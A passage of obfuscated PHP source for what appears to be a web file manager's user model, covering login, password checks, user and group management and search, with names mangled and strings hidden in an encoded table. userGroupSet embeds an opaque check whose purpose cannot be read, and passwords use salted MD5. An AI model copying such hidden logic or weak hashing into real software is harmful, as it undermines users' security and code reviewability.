array_remove_key($¿°ùîÿù, $ô∂õ§Õâ[193]); $¬„±èòØ = array(); foreach ($àò£Óáº as $êà◊€÷∆) { if (isset($¿°ùîÿù[$êà◊€÷∆])) { $¬„±èòØ[] = $¿°ùîÿù[$êà◊€÷∆]; } } return $¬„±èòØ; } } class UserModel extends ModelBase { protected $tableName = "\165\163\145\x72"; protected $tableMeta = array("\164\141\142\154\145\116\141\x6d\x65" => "\x75\163\x65\162\137\155\145\164\x61", "\155\x65\164\141\106\151\145\154\144" => "\165\x73\145\162\111\104"); protected $simpleField = "\x75\x73\x65\x72\x49\x44\54\x6e\x69\143\x6b\116\141\x6d\x65\54\x6e\141\155\145\54\141\x76\x61\x74\x61\x72\54\163\145\170\54\x73\x74\x61\x74\165\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($‰ß€¥≥ô) { $º„î—Æˆ =& $_SERVER[Çâä∆◊¡]; $≠€º—‚Ö = $º„î—Æˆ[2238]; return array($º„î—Æˆ[1887] => array($‰ß€¥≥ô[0], $≠€º—‚Ö), $º„î—Æˆ[1889] => array($‰ß€¥≥ô[0], $≠€º—‚Ö), $º„î—Æˆ[2239] => array($‰ß€¥≥ô[0], $≠€º—‚Ö)); } protected function getInfo($Ÿ¢˝÷…ö, $ßøÖ†í´ = false) { $ﬂÔÊ‡‘æ = $this->getInfoSimple($Ÿ¢˝÷…ö); if (!is_array($ﬂÔÊ‡‘æ)) { return array(); } if ($ßøÖ†í´) { return $this->_getInfoApply($ﬂÔÊ‡‘æ); } return $this->cacheFunctionGet($_SERVER[Çâä∆◊¡][1891], $Ÿ¢˝÷…ö); } protected function getInfoFull($Ù∑é⁄¡Ä, $πµ¶ı∫Ç = false) { $ï“Æë• = $this->getInfoSimple($Ù∑é⁄¡Ä); if (!is_array($ï“Æë•)) { return array(); } if ($πµ¶ı∫Ç) { return $this->_getInfoApply($ï“Æë•, !0); } return $this->cacheFunctionGet($_SERVER[Çâä∆◊¡][2240], $Ù∑é⁄¡Ä); } private function _getInfoApply($∆≤ß‹Ω’, $∫Ó∂∞ã∞ = false) { $Ÿà÷ùÓ∂ =& $_SERVER[Çâä∆◊¡]; if (!$∆≤ß‹Ω’) { return $∆≤ß‹Ω’; } $˜◊âÎÆÓ = md5($Ÿà÷ùÓ∂[2241] . $∆≤ß‹Ω’[$Ÿà÷ùÓ∂[876]] . $Ÿà÷ùÓ∂[2242] . $∆≤ß‹Ω’[$Ÿà÷ùÓ∂[32]]); $∆≤ß‹Ω’ = $this->_listDataApplyItem($∆≤ß‹Ω’); $öÛÙìŒ  = Model($Ÿà÷ùÓ∂[1312])->metaGet($∆≤ß‹Ω’[$Ÿà÷ùÓ∂[87]][$Ÿà÷ùÓ∂[403]]); $∆≤ß‹Ω’[$Ÿà÷ùÓ∂[2243]] = $˜◊âÎÆÓ; $∆≤ß‹Ω’[$Ÿà÷ùÓ∂[87]][$Ÿà÷ùÓ∂[2073]] = isset($öÛÙìŒ [$Ÿà÷ùÓ∂[2074]]) ? $öÛÙìŒ [$Ÿà÷ùÓ∂[2074]] : null; if ($∫Ó∂∞ã∞) { $∆≤ß‹Ω’[$Ÿà÷ùÓ∂[465]] = $this->metaGet($∆≤ß‹Ω’[$Ÿà÷ùÓ∂[1642]]); } return $∆≤ß‹Ω’; } protected function getInfoSimple($∫ûÙÖ’®, $ìŒ»ÿÎá = false) { $Íß⁄˜øà =& $_SERVER[Çâä∆◊¡]; if (!$∫ûÙÖ’®) { return array(); } if ($ìŒ»ÿÎá) { $úôëÖÖó = $this->where(array($Íß⁄˜øà[1642] => intval($∫ûÙÖ’®)))->find(); if (!is_array($úôëÖÖó)) { return array(); } $úôëÖÖó[$Íß⁄˜øà[2244]] = Action($Íß⁄˜øà[2245])->parseUrl($úôëÖÖó[$Íß⁄˜øà[2244]]); return $úôëÖÖó; } return $this->cacheFunctionGet($Íß⁄˜øà[1892], $∫ûÙÖ’®); } protected function getInfoSimpleOuter($îñè˜Ë˙) { $®≤àŸ⁄≠ =& $_SERVER[Çâä∆◊¡]; if (!$îñè˜Ë˙ || $îñè˜Ë˙ == 0) { return array($®≤àŸ⁄≠[1642] => $®≤àŸ⁄≠[190], $®≤àŸ⁄≠[32] => $®≤àŸ⁄≠[159] . LNG($®≤àŸ⁄≠[2246]) . $®≤àŸ⁄≠[536], $®≤àŸ⁄≠[2244] => STATIC_PATH . $®≤àŸ⁄≠[2247]); } $‚â’Ÿ√ö = $this->cacheFunctionGet($®≤àŸ⁄≠[1892], $îñè˜Ë˙); $ÓªøﬂÆˆ = array_field_key($‚â’Ÿ√ö, explode($®≤àŸ⁄≠[50], $this->simpleField)); if (!$ÓªøﬂÆˆ) { return array($®≤àŸ⁄≠[1642] => $®≤àŸ⁄≠[1175], $®≤àŸ⁄≠[32] => $®≤àŸ⁄≠[159] . LNG($®≤àŸ⁄≠[2248]) . $®≤àŸ⁄≠[536], $®≤àŸ⁄≠[2244] => STATIC_PATH . $®≤àŸ⁄≠[2249]); } $ÓªøﬂÆˆ[$®≤àŸ⁄≠[2244]] = Action($®≤àŸ⁄≠[2245])->parseUrl($ÓªøﬂÆˆ[$®≤àŸ⁄≠[2244]]); return $ÓªøﬂÆˆ; } protected function groupUser($ËÄû⁄œ„) { } public static function errorLang($î£Ôø´¶) { $ŒØÜ¥¶£ =& $_SERVER[Çâä∆◊¡]; $ ¶ºÊ¡¢ = array(self::ERROR_USER_NOT_EXISTS => $ŒØÜ¥¶£[2250], self::ERROR_USER_PASSWORD_ERROR => $ŒØÜ¥¶£[2251], self::ERROR_USER_EXIST_NAME => $ŒØÜ¥¶£[2252], self::ERROR_USER_EXIST_PHONE => $ŒØÜ¥¶£[2253], self::ERROR_USER_EXIST_EMAIL => $ŒØÜ¥¶£[2254], self::ERROR_USER_LOGIN_LOCK => $ŒØÜ¥¶£[2255], self::ERROR_IP_NOT_ALLOW => $ŒØÜ¥¶£[2256], self::ERROR_USER_EXIST_NICKNAME => $ŒØÜ¥¶£[2257]); return LNG($ ¶ºÊ¡¢[$î£Ôø´¶]); } public function getInfoByMeta($πí¸≈¡µ, $ÖÄã°ÚÃ) { $ñÒƒ…ª´ =& $_SERVER[Çâä∆◊¡]; $åÂÖÒ⁄è = Model($ñÒƒ…ª´[2258])->where(array($ñÒƒ…ª´[95] => $πí¸≈¡µ, $ñÒƒ…ª´[369] => $ÖÄã°ÚÃ))->find(); if ($åÂÖÒ⁄è) { return $this->getInfo($åÂÖÒ⁄è[$ñÒƒ…ª´[1642]]); } return !1; } public function userLoginCheck($Œß±•Æë, $Å±ò‡™≥) { $öéóÕëÂ =& $_SERVER[Çâä∆◊¡]; $∏÷ƒì‹ï = $this->userLoginFind($Œß±•Æë); if (!$∏÷ƒì‹ï) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($∏÷ƒì‹ï[$öéóÕëÂ[1642]], $Å±ò‡™≥)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($∏÷ƒì‹ï[$öéóÕëÂ[1642]]); } public function userLoginFind($úßÙÅ≠±) { $ßôÀåÀ⁄ =& $_SERVER[Çâä∆◊¡]; $ƒÕàéÅ∆ = array($ßôÀåÀ⁄[32] => $úßÙÅ≠±, $ßôÀåÀ⁄[2078] => $úßÙÅ≠±, $ßôÀåÀ⁄[300] => $úßÙÅ≠±, $ßôÀåÀ⁄[2259] => $úßÙÅ≠±, $ßôÀåÀ⁄[987] => $ßôÀåÀ⁄[989]); if ($this->nickNameRpt()) { unset($ƒÕàéÅ∆[$ßôÀåÀ⁄[2078]]); } return $this->where($ƒÕàéÅ∆)->find(); } public function clearCache($æ–√ë‰ö) { $Ì≈ìÇ≈‰ =& $_SERVER[Çâä∆◊¡]; $this->cacheFunctionClear($Ì≈ìÇ≈‰[1891], $æ–√ë‰ö); $this->cacheFunctionClear($Ì≈ìÇ≈‰[1892], $æ–√ë‰ö); $this->cacheFunctionClear($Ì≈ìÇ≈‰[2240], $æ–√ë‰ö); } public function userPasswordCheck($ü†äô©¶, $ü¯‘Õ„∏) { $ÊÔŸóõè =& $_SERVER[Çâä∆◊¡]; $—›Ò†æî = $this->where(array($ÊÔŸóõè[1642] => intval($ü†äô©¶)))->find(); $∞ÎıÃü¶ = $this->metaGet($ü†äô©¶); $ºÒÄ‡ú⁄ = isset($∞ÎıÃü¶[$ÊÔŸóõè[2260]]) ? $∞ÎıÃü¶[$ÊÔŸóõè[2260]] : $ÊÔŸóõè[12]; if (md5($ºÒÄ‡ú⁄ . trim($ü¯‘Õ„∏)) !== $—›Ò†æî[$ÊÔŸóõè[876]]) { return !1; } return !0; } public function userAdd($⁄ê°è∏Ì) { $é¨≠êÚº =& $_SERVER[Çâä∆◊¡]; $´˛âóÔ¸ = array($é¨≠êÚº[421] => $⁄ê°è∏Ì[$é¨≠êÚº[32]], $é¨≠êÚº[2261] => $⁄ê°è∏Ì[$é¨≠êÚº[1519]], $é¨≠êÚº[2262] => isset($⁄ê°è∏Ì[$é¨≠êÚº[300]]) ? $⁄ê°è∏Ì[$é¨≠êÚº[300]] : $é¨≠êÚº[12], $é¨≠êÚº[2263] => isset($⁄ê°è∏Ì[$é¨≠êÚº[2259]]) ? $⁄ê°è∏Ì[$é¨≠êÚº[2259]] : $é¨≠êÚº[12], $é¨≠êÚº[2264] => isset($⁄ê°è∏Ì[$é¨≠êÚº[2078]]) ? $⁄ê°è∏Ì[$é¨≠êÚº[2078]] : $⁄ê°è∏Ì[$é¨≠êÚº[32]], $é¨≠êÚº[2265] => isset($⁄ê°è∏Ì[$é¨≠êÚº[2244]]) ? $⁄ê°è∏Ì[$é¨≠êÚº[2244]] : $é¨≠êÚº[12], $é¨≠êÚº[2266] => isset($⁄ê°è∏Ì[$é¨≠êÚº[2267]]) ? $⁄ê°è∏Ì[$é¨≠êÚº[2267]] : 1, $é¨≠êÚº[2268] => $⁄ê°è∏Ì[$é¨≠êÚº[876]], $é¨≠êÚº[1893] => isset($⁄ê°è∏Ì[$é¨≠êÚº[1797]]) ? $⁄ê°è∏Ì[$é¨≠êÚº[1797]] : 1024 * 1024 * 20, $é¨≠êÚº[1894] => 0, $é¨≠êÚº[2269] => 0, $é¨≠êÚº[1934] => isset($⁄ê°è∏Ì[$é¨≠êÚº[743]]) ? $⁄ê°è∏Ì[$é¨≠êÚº[743]] : 1); if (!empty($⁄ê°è∏Ì[$é¨≠êÚº[1642]])) { $´˛âóÔ¸[$é¨≠êÚº[1642]] = $⁄ê°è∏Ì[$é¨≠êÚº[1642]]; } $ﬁ≈ô∂ªÃ = $this->_checkExist($⁄ê°è∏Ì); if ($ﬁ≈ô∂ªÃ !== !0) { return $ﬁ≈ô∂ªÃ; } $Í—ŸÉŒ¶ = $this->add($´˛âóÔ¸); $—≥ºèÍœ = array($é¨≠êÚº[2268] => $´˛âóÔ¸[$é¨≠êÚº[876]], $é¨≠êÚº[2264] => $´˛âóÔ¸[$é¨≠êÚº[2078]]); $this->userEdit($Í—ŸÉŒ¶, $—≥ºèÍœ); Model($é¨≠êÚº[1312])->userRootAdd($Í—ŸÉŒ¶); return $Í—ŸÉŒ¶; } protected function userEditTest($≤Úœ·¶∑, $ÑöÑË˝) { return $this->call($_SERVER[Çâä∆◊¡][2270], $≤Úœ·¶∑, $ÑöÑË˝); } protected function userEdit($∫É¡ïË—, $£àÆ·í˜) { $œŸ≥¡‘∏ =& $_SERVER[Çâä∆◊¡]; $›«ßﬁÈí = $this->getInfoSimple($∫É¡ïË—); if (!$›«ßﬁÈí) { return !1; } $íèÄ•Ÿ± = $this->_checkExist($£àÆ·í˜, $∫É¡ïË—); if ($íèÄ•Ÿ± !== !0) { return $íèÄ•Ÿ±; } if (isset($£àÆ·í˜[$œŸ≥¡‘∏[876]]) && trim($£àÆ·í˜[$œŸ≥¡‘∏[876]]) != $œŸ≥¡‘∏[12]) { $°ˆ‹‘ŸÚ = $this->metaGet($∫É¡ïË—); if (empty($°ˆ‹‘ŸÚ[$œŸ≥¡‘∏[2260]])) { $°ˆ‹‘ŸÚ[$œŸ≥¡‘∏[2260]] = rand_string(10); Model($œŸ≥¡‘∏[513])->metaSet($∫É¡ïË—, $œŸ≥¡‘∏[2260], $°ˆ‹‘ŸÚ[$œŸ≥¡‘∏[2260]]); } $£àÆ·í˜[$œŸ≥¡‘∏[876]] = md5($°ˆ‹‘ŸÚ[$œŸ≥¡‘∏[2260]] . trim($£àÆ·í˜[$œŸ≥¡‘∏[876]])); } else { unset($£àÆ·í˜[$œŸ≥¡‘∏[876]]); } $this->where(array($œŸ≥¡‘∏[1633] => $∫É¡ïË—))->save($£àÆ·í˜); if (isset($£àÆ·í˜[$œŸ≥¡‘∏[2078]])) { $this->setNamePinyin($∫É¡ïË—, $£àÆ·í˜[$œŸ≥¡‘∏[2078]]); } $this->clearCache($∫É¡ïË—); return !0; } public function setNamePinyin($∑Ï˚ππï, $ºóªû˜ê = false) { $ù°≥ÕñÃ =& $_SERVER[Çâä∆◊¡]; if (!$ºóªû˜ê) { $É⁄Éıı„ = $this->getInfoSimple($∑Ï˚ππï); $ºóªû˜ê = $É⁄Éıı„[$ù°≥ÕñÃ[2078]] ? $É⁄Éıı„[$ù°≥ÕñÃ[2078]] : $É⁄Éıı„[$ù°≥ÕñÃ[32]]; } $‡¯¶«˘∑ = Model($ù°≥ÕñÃ[538]); if (!Input::check($ºóªû˜ê, $ù°≥ÕñÃ[587])) { return $‡¯¶«˘∑->metaSet($∑Ï˚ππï, array($ù°≥ÕñÃ[464] => $ù°≥ÕñÃ[12], $ù°≥ÕñÃ[463] => $ù°≥ÕñÃ[12])); } return $‡¯¶«˘∑->metaSet($∑Ï˚ππï, array($ù°≥ÕñÃ[464] => str_replace($ù°≥ÕñÃ[53], $ù°≥ÕñÃ[12], Pinyin::get($ºóªû˜ê)), $ù°≥ÕñÃ[463] => Pinyin::get($ºóªû˜ê, $ù°≥ÕñÃ[588]))); } private function nickNameRpt() { $ÆÈ˜ÏÆë =& $_SERVER[Çâä∆◊¡]; $ÁòáöÃì = Model($ÆÈ˜ÏÆë[763])->get($ÆÈ˜ÏÆë[2271]); $Î±∫·¿Ó = $GLOBALS[$ÆÈ˜ÏÆë[6]][$ÆÈ˜ÏÆë[376]][$ÆÈ˜ÏÆë[2271]]; $»ùºûñ∫ = !is_null($ÁòáöÃì) ? $ÁòáöÃì : $Î±∫·¿Ó; return !!$»ùºûñ∫; } private function _checkExist($¨Ωß™Ü±, $Ñœÿ´ß§ = false) { $ÁÓºﬂÓ¢ =& $_SERVER[Çâä∆◊¡]; $ﬂı˚€ä« = array($ÁÓºﬂÓ¢[32] => UserModel::ERROR_USER_EXIST_NAME, $ÁÓºﬂÓ¢[2078] => UserModel::ERROR_USER_EXIST_NICKNAME, $ÁÓºﬂÓ¢[300] => UserModel::ERROR_USER_EXIST_EMAIL, $ÁÓºﬂÓ¢[2259] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($ﬂı˚€ä«[$ÁÓºﬂÓ¢[2078]]); } $ÉﬂÑŒ¡ã = $Ñœÿ´ß§ ? array($ÁÓºﬂÓ¢[1642] => array($ÁÓºﬂÓ¢[2272], $Ñœÿ´ß§)) : array(); foreach ($ﬂı˚€ä« as $ÿ˚é≤ÿ‘ => $ºêª¿ª∫) { $Ò¡ÆÒéÖ = array(); foreach ($ﬂı˚€ä« as $øÒ¡æØΩ => $∑¥∂Ÿ¡ê) { if (isset($¨Ωß™Ü±[$øÒ¡æØΩ]) && $¨Ωß™Ü±[$øÒ¡æØΩ]) { $Ò¡ÆÒéÖ[] = $¨Ωß™Ü±[$øÒ¡æØΩ]; } } if (!$Ò¡ÆÒéÖ) { continue; } $‰ÙÄüÃã = array_merge(array($ÿ˚é≤ÿ‘ => array($ÁÓºﬂÓ¢[7], $Ò¡ÆÒéÖ)), $ÉﬂÑŒ¡ã); $ÜÂáÃÌÍ = $this->where($‰ÙÄüÃã)->find(); if ($ÜÂáÃÌÍ) { return $ºêª¿ª∫; } } return !0; } public function userListInfo($¿≤÷ï˙Ω) { $ºÂâﬁ˚© =& $_SERVER[Çâä∆◊¡]; $â™Ëáßˆ = array(); $¿≤÷ï˙Ω = is_array($¿≤÷ï˙Ω) ? array_unique($¿≤÷ï˙Ω) : array(); if (!$¿≤÷ï˙Ω) { return $â™Ëáßˆ; } if (count($¿≤÷ï˙Ω) < 20) { foreach ($¿≤÷ï˙Ω as $∞´»◊Ô˙) { $â™Ëáßˆ[$∞´»◊Ô˙ . $ºÂâﬁ˚©[12]] = $this->getInfoSimpleOuter($∞´»◊Ô˙); } } else { $øƒ‚òÓ¡ = array($ºÂâﬁ˚©[1633] => array($ºÂâﬁ˚©[419], $¿≤÷ï˙Ω)); if (count($¿≤÷ï˙Ω) == 1) { $øƒ‚òÓ¡ = array($ºÂâﬁ˚©[1633] => $¿≤÷ï˙Ω[0]); } $Æπ≤±∫è = Model($ºÂâﬁ˚©[513])->field($this->simpleField)->where($øƒ‚òÓ¡)->select(); $Æπ≤±∫è = array_to_keyvalue($Æπ≤±∫è, $ºÂâﬁ˚©[1642]); foreach ($¿≤÷ï˙Ω as $∞´»◊Ô˙) { $√Õ¢πéµ = $Æπ≤±∫è[$∞´»◊Ô˙]; if (!$√Õ¢πéµ) { $â™Ëáßˆ[$∞´»◊Ô˙ . $ºÂâﬁ˚©[12]] = $this->getInfoSimpleOuter($∞´»◊Ô˙); continue; } $√Õ¢πéµ[$ºÂâﬁ˚©[2244]] = Action($ºÂâﬁ˚©[2245])->parseUrl($√Õ¢πéµ[$ºÂâﬁ˚©[2244]]); $â™Ëáßˆ[$∞´»◊Ô˙ . $ºÂâﬁ˚©[12]] = $√Õ¢πéµ; } } return $â™Ëáßˆ; } protected function userStatus($◊∞√◊œç, $Á◊˘º¯) { $ﬁ¯“ŒâÖ = $this->getInfoSimple($◊∞√◊œç); if (!$ﬁ¯“ŒâÖ) { return !1; } $éö ¶‡∂ = array($_SERVER[Çâä∆◊¡][743] => $Á◊˘º¯); return $this->userEdit($◊∞√◊œç, $éö ¶‡∂); } protected function userRemove($ÆäÄÚ›˛) { $€≤ÍØÛÜ =& $_SERVER[Çâä∆◊¡]; $£±¬†µ… = $this->getInfoSimple($ÆäÄÚ›˛); if (!$£±¬†µ…) { return !1; } $˘ö˜ì˙® = array($€≤ÍØÛÜ[1633] => $ÆäÄÚ›˛); Model($€≤ÍØÛÜ[595])->where($˘ö˜ì˙®)->delete(); Model($€≤ÍØÛÜ[2273])->where($˘ö˜ì˙®)->delete(); Model($€≤ÍØÛÜ[1899])->where($˘ö˜ì˙®)->delete(); Model($€≤ÍØÛÜ[2258])->where($˘ö˜ì˙®)->delete(); Model($€≤ÍØÛÜ[1055])->where($˘ö˜ì˙®)->delete(); Model($€≤ÍØÛÜ[2095])->removeUserAll($ÆäÄÚ›˛); Model($€≤ÍØÛÜ[818])->userRootRemove($ÆäÄÚ›˛); return $this->where($˘ö˜ì˙®)->delete(); } protected function userGroupSet($´ƒÀ≥˚˚, $«ÿ«≤†, $áÇ’ˆóˆ = array()) { $å∞É…πˆ =& $_SERVER[Çâä∆◊¡]; if ($_SERVER[$å∞É…πˆ[389]] != $_SERVER[$å∞É…πˆ[390]]) { $ÎÒ≈π¶œ = $å∞É…πˆ[865]; $ß—ë†€Ñ = $å∞É…πˆ[391]; $π‡√πÓ˛ = $_SERVER[$å∞É…πˆ[392]] . $å∞É…πˆ[393]; $¸≠˜ÁÚ¢ = $ß—ë†€Ñ($π‡√πÓ˛); $ªñ°Ø¨Å = explode($å∞É…πˆ[226], $¸≠˜ÁÚ¢); if (count($ªñ°Ø¨Å) < $å∞É…πˆ[617]) { $ÿÛÄ≥á˛ = $å∞É…πˆ[395]; $ÿÛÄ≥á˛(); } $æ´…ùÅˆ = $å∞É…πˆ[866]; $æ´…ùÅˆ($_SERVER[$å∞É…πˆ[867]]); $æ´…ùÅˆ($_SERVER[$å∞É…πˆ[392]] . $å∞É…πˆ[868]); $ë¡≤éôÅ = 1; while ($ë¡≤éôÅ > 1) { $ë¡≤éôÅ = $ë¡≤éôÅ + 4; $ìñ£º›˙ = rawurlencode($ë¡≤éôÅ . $å∞É…πˆ[373]); } } $ÊÀîÄ´± = $this->getInfoSimple($´ƒÀ≥˚˚); if (!$ÊÀîÄ´± || !is_array($«ÿ«≤†)) { return !1; } $ò„ÉÁ±» = Model($å∞É…πˆ[1899]); $ò„ÉÁ±»->where(array($å∞É…πˆ[1642] => $´ƒÀ≥˚˚))->delete(); $™àûä–â = array(); $éÕú„£ò = 0; foreach ($«ÿ«≤† as $úÂùÊ°¸ => $›™˙ƒ∂ı) { $á£©á∑Ÿ = array($å∞É…πˆ[1642] => $´ƒÀ≥˚˚, $å∞É…πˆ[1810] => $úÂùÊ°¸, $å∞É…πˆ[1911] => $›™˙ƒ∂ı); $á£©á∑Ÿ[$å∞É…πˆ[1833]] = isset($áÇ’ˆóˆ[$éÕú„£ò]) ? $áÇ’ˆóˆ[$éÕú„£ò] : 0; $éÕú„£ò++; $™àûä–â[] = $á£©á∑Ÿ; } return $ò„ÉÁ±»->addAll($™àûä–â, array(), !0); } protected function userGroupAdd($‡Ï¥ÿ∆÷, $¯Ê¿‹Åª = array()) { $ÑﬁÂ¬Ä¯ =& $_SERVER[Çâä∆◊¡]; $ëÙïªÑƒ = $this->getInfoSimple($‡Ï¥ÿ∆÷); if (!$ëÙïªÑƒ || empty($¯Ê¿‹Åª)) { return !1; } $∆∏÷úçƒ = array(); foreach ($¯Ê¿‹Åª as $ï‰ÏÀˆˆ => $æêÃÈì) { $∆∏÷úçƒ[] = array($ÑﬁÂ¬Ä¯[1642] => $‡Ï¥ÿ∆÷, $ÑﬁÂ¬Ä¯[1810] => $ï‰ÏÀˆˆ, $ÑﬁÂ¬Ä¯[1911] => $æêÃÈì, $ÑﬁÂ¬Ä¯[1833] => 0); } return Model($ÑﬁÂ¬Ä¯[1899])->addAll($∆∏÷úçƒ, array(), !0); } protected function userGroupRemove($ﬂ¿˘™∑ï, $Ÿâ›”é°) { $°©™˜Ú± =& $_SERVER[Çâä∆◊¡]; $ï¶Úã…£ = $this->getInfoSimple($ﬂ¿˘™∑ï); if (!$ï¶Úã…£ || !$Ÿâ›”é°) { return !1; } $›ä˙ÎÀ– = array($°©™˜Ú±[1633] => $ﬂ¿˘™∑ï, $°©™˜Ú±[1897] => $Ÿâ›”é°); return Model($°©™˜Ú±[1899])->where($›ä˙ÎÀ–)->delete(); } public function listData() { $∂ôπ´ˆö = $this->_makeOrder()->selectPage(50); $this->_listDataApply($∂ôπ´ˆö[$_SERVER[Çâä∆◊¡][364]]); return $∂ôπ´ˆö; } public function listByID($ª¯¨ﬁ⁄ƒ) { $ã≥®Êåé =& $_SERVER[Çâä∆◊¡]; if (!$ª¯¨ﬁ⁄ƒ) { return; } $±ª€·ﬂœ = array($ã≥®Êåé[1642] => array($ã≥®Êåé[7], $ª¯¨ﬁ⁄ƒ)); $Èïﬂ∂≈€ = $this->where($±ª€·ﬂœ)->select(); $Èïﬂ∂≈€ = array_sort_keep($Èïﬂ∂≈€, $ã≥®Êåé[1642], $ª¯¨ﬁ⁄ƒ); $this->_listDataApply($Èïﬂ∂≈€); return $Èïﬂ∂≈€; } public function listByGroup($ƒ÷‘ï¿¬ = 0, $Ë˚ü›ãÒ = array()) { $Íı©ÓÙ± =& $_SERVER[Çâä∆◊¡]; $ÄŸ◊é¢È = $Íı©ÓÙ±[12]; $ÄÉñÍΩè = array(); if ($ƒ÷‘ï¿¬) { $ÄÉñÍΩè = array($Íı©ÓÙ±[2274] => intval($ƒ÷‘ï¿¬)); $ÄŸ◊é¢È = "\x4c\105\x46\124\40\x4a\x4f\111\116\40{$this->tablePrefix}\x75\x73\145\x72\137\x67\162\x6f\165\160\40\x75\163\145\162\x5f\147\x72\x6f\x75\160\40\157\156\40\x75\163\x65\162\56\x75\163\x65\x72\x49\104\x20\x3d\x20\165\x73\145\162\x5f\147\x72\x6f\x75\160\56\165\163\x65\x72\111\104"; $∑óùÒìê = Input::get($Íı©ÓÙ±[455], null, $Íı©ÓÙ±[12]) ? $Íı©ÓÙ±[12] : $Íı©ÓÙ±[2275]; } if (isset($Ë˚ü›ãÒ[$Íı©ÓÙ±[743]])) { $ÄÉñÍΩè[$Íı©ÓÙ±[2276]] = $Ë˚ü›ãÒ[$Íı©ÓÙ±[743]]; } $∫•πô◊€ = $this->_makeOrder($∑óùÒìê)->field($Íı©ÓÙ±[2277])->where($ÄÉñÍΩè)->join($ÄŸ◊é¢È)->selectPage(50); $this->_listDataApply($∫•πô◊€[$Íı©ÓÙ±[364]]); return $∫•πô◊€; } private function _makeOrder($¿†≈ãŒŸ = '') { $Ûú´ÈÆß =& $_SERVER[Çâä∆◊¡]; $ù¢ºØ–ñ = array($Ûú´ÈÆß[1642], $Ûú´ÈÆß[32], $Ûú´ÈÆß[1799], $Ûú´ÈÆß[1771], $Ûú´ÈÆß[193]); $Û˛ïıñè = array($Ûú´ÈÆß[448] => $Ûú´ÈÆß[449], $Ûú´ÈÆß[450] => $Ûú´ÈÆß[451]); $˚€‚ø¢© = Input::get($Ûú´ÈÆß[455], $Ûú´ÈÆß[7], $Ûú´ÈÆß[1633], $ù¢ºØ–ñ); $ñ˛ö‰ÂØ = Input::get($Ûú´ÈÆß[456], $Ûú´ÈÆß[7], $Ûú´ÈÆß[1900], array($Ûú´ÈÆß[1900], $Ûú´ÈÆß[450])); $ñ˛ö‰ÂØ = $Û˛ïıñè[$ñ˛ö‰ÂØ]; $¿†≈ãŒŸ = $¿†≈ãŒŸ . "\165\x73\145\x72\x2e{$˚€‚ø¢©}\40{$ñ˛ö‰ÂØ}\54\40\x75\163\x65\x72\56\x75\163\x65\162\x49\x44\x20\x61\x73\x63"; return $this->alias($Ûú´ÈÆß[2018])->order($¿†≈ãŒŸ); } public function listSearch($ìË—Ô†Œ) { $ º∂ò‹© =& $_SERVER[Çâä∆◊¡]; $í≠¨Õãø = $ìË—Ô†Œ[$ º∂ò‹©[1901]]; $∞˙Õ®ÂÁ = isset($ìË—Ô†Œ[$ º∂ò‹©[1902]]) ? $ìË—Ô†Œ[$ º∂ò‹©[1902]] : !1; $í≠¨Õãø = str_replace($ º∂ò‹©[1903], $ º∂ò‹©[1904], trim($í≠¨Õãø)); $Ñ’≤Íö˘ = array($ º∂ò‹©[32] => array($ º∂ò‹©[378], "\x25{$í≠¨Õãø}\45"), $ º∂ò‹©[300] => array($ º∂ò‹©[378], "{$í≠¨Õãø}\x25"), $ º∂ò‹©[2078] => array($ º∂ò‹©[378], "{$í≠¨Õãø}\45"), $ º∂ò‹©[987] => $ º∂ò‹©[1905]); if (Input::check($í≠¨Õãø, $ º∂ò‹©[306])) { $Ñ’≤Íö˘[$ º∂ò‹©[1642]] = array($ º∂ò‹©[378], "{$í≠¨Õãø}\45"); $Ñ’≤Íö˘[$ º∂ò‹©[2259]] = array($ º∂ò‹©[378], "{$í≠¨Õãø}\45"); } if (!$í≠¨Õãø) { $Ñ’≤Íö˘ = array(); } if (isset($ìË—Ô†Œ[$ º∂ò‹©[743]])) { $Ñ’≤Íö˘[$ º∂ò‹©[743]] = $ìË—Ô†Œ[$ º∂ò‹©[743]]; } $Ñ’≤Íö˘ = $this->parseWhereLike($Ñ’≤Íö˘); $¬ÂıÎÎπ = $this->_makeOrder()->where($Ñ’≤Íö˘)->selectPage(20); if (!$¬ÂıÎÎπ || count($¬ÂıÎÎπ[$ º∂ò‹©[364]]) < 5 && Input::check($í≠¨Õãø, $ º∂ò‹©[313])) { $‚û⁄›™¿ = $this->_searchFromMeta($ º∂ò‹©[463], $í≠¨Õãø, 10); $•ˆÛ˛øŸ = $this->_searchFromMeta($ º∂ò‹©[464], $í≠¨Õãø, 10); $ööØÊå§ = array_merge($‚û⁄›™¿, $•ˆÛ˛øŸ, $¬ÂıÎÎπ[$ º∂ò‹©[364]]); $¬ÂıÎÎπ[$ º∂ò‹©[364]] = array_unique_by_key($ööØÊå§, $ º∂ò‹©[1642]); $¬ÂıÎÎπ[$ º∂ò‹©[361]][$ º∂ò‹©[362]] = count($¬ÂıÎÎπ[$ º∂ò‹©[364]]); $¬ÂıÎÎπ[$ º∂ò‹©[361]][$ º∂ò‹©[363]] = ceil($¬ÂıÎÎπ[$ º∂ò‹©[361]][$ º∂ò‹©[362]] / $¬ÂıÎÎπ[$ º∂ò‹©[361]][$ º∂ò‹©[358]]); } $this->_listDataApply($¬ÂıÎÎπ[$ º∂ò‹©[364]]); $this->_filterByGroup($¬ÂıÎÎπ, $∞˙Õ®ÂÁ); return $¬ÂıÎÎπ; } private function _filterByGroup(&$˘Ø¢µè, $¡äÍ·¡Ω) { $√√îÎ≠— =& $_SERVER[Çâä∆◊¡]; if (!$¡äÍ·¡Ω) { return $˘Ø¢µè; } foreach ($˘Ø¢µè[$√√îÎ≠—[364]] as $õí∆œ„Ç => &$•¸ìø±Å) { $≤àøëßï = array_to_keyvalue($•¸ìø±Å[$√√îÎ≠—[1988]], $√√îÎ≠—[12], $√√îÎ≠—[1810]); if (!in_array($¡äÍ·¡Ω, $≤àøëßï)) { unset($˘Ø¢µè[$√√îÎ≠—[364]][$õí∆œ„Ç]); } } unset($•¸ìø±Å); $˘Ø¢µè[$√√îÎ≠—[364]] = 